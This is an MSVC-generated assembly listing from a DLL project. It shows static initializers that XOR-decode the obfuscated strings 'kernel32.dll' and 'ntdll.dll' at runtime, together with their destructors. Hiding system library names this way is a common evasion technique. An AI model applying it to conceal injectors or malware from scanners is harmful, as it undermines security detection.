?_Ceiling_of_log_2@std@@YAK_K@Z ENDP			; std::_Ceiling_of_log_2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ PROC ; ProcessUtilities::freqDLLS::<lambda_1>::operator(), COMDAT

; 32   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN26@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 17789827		; 010f7383H
	mov	DWORD PTR [rbx], 1906178582		; 719dfa16H
	mov	DWORD PTR [rbx+4], -14228118		; ff26e56aH
	mov	WORD PTR [rbx+8], 64339			; 0000fb53H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 32   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN26@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ ENDP ; ProcessUtilities::freqDLLS::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA PROC ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4HA ENDP ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
text$di	SEGMENT
??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32'', COMDAT

; 32   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN47@dynamic
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 17789827		; 010f7383H
	mov	DWORD PTR [rbx], 1906178582		; 719dfa16H
	mov	DWORD PTR [rbx+4], -14228118		; ff26e56aH
	mov	WORD PTR [rbx+8], 64339			; 0000fb53H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 32   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN47@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+13], 0
	je	$LN15@dynamic

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN56@dynamic

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@cd15890f1fef9f7dcd15890f1fef9f7d
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN56@dynamic:
	mov	r9, -3668875623370088579		; cd15890f1fef9f7dH
	npad	6
$LL55@dynamic:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 13
	jb	SHORT $LL55@dynamic

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+13], 0
$LN15@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 32   : 		static const std::string kernel32 = std::string(HIDE("kernel32.dll"));	

	mov	rdx, rbx
	lea	rcx, OFFSET FLAT:?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	lea	rcx, OFFSET FLAT:??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'kernel32''
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	atexit
??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32'''::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'kernel32'''::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ
text$yd	SEGMENT
??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'kernel32'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN20@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN34@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN43@dynamic
$LN34@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqa	XMMWORD PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+16, xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR ?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B, 0
	add	rsp, 40					; 00000028H
	ret	0
$LN43@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@dynamic:
??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'kernel32''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@YAXXZ PROC ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	BYTE PTR [rdx+12], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0?DCOKHGPAOABAGAID@D@ay@@XZ@YAXXZ ENDP ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ PROC ; ProcessUtilities::freqDLLS::<lambda_2>::operator(), COMDAT

; 33   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN21@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+9], 345			; 00000159H
	mov	DWORD PTR [rbx], 398929249		; 17c72d61H
	mov	DWORD PTR [rbx+4], 53601273		; 0331e3f9H
	mov	BYTE PTR [rbx+8], 99			; 00000063H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 33   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN21@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ ENDP ; ProcessUtilities::freqDLLS::<lambda_2>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA PROC ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4HA ENDP ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
text$di	SEGMENT
??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll'', COMDAT

; 33   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN42@dynamic
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+9], 345			; 00000159H
	mov	DWORD PTR [rbx], 398929249		; 17c72d61H
	mov	DWORD PTR [rbx+4], 53601273		; 0331e3f9H
	mov	BYTE PTR [rbx+8], 99			; 00000063H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 33   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN42@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+10], 0
	je	$LN15@dynamic

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN51@dynamic

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@6f55cd957ba3590f6f55cd957ba3590f
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN51@dynamic:
	mov	r9, 8022544353138530575			; 6f55cd957ba3590fH
	npad	9
$LL50@dynamic:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 10
	jb	SHORT $LL50@dynamic

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+10], 0
$LN15@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 33   : 		static const std::string ntdll    = std::string(HIDE("ntdll.dll"));

	mov	rdx, rbx
	lea	rcx, OFFSET FLAT:?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	lea	rcx, OFFSET FLAT:??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'ntdll''
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	atexit
??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll'''::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll'''::`1'::dtor$0
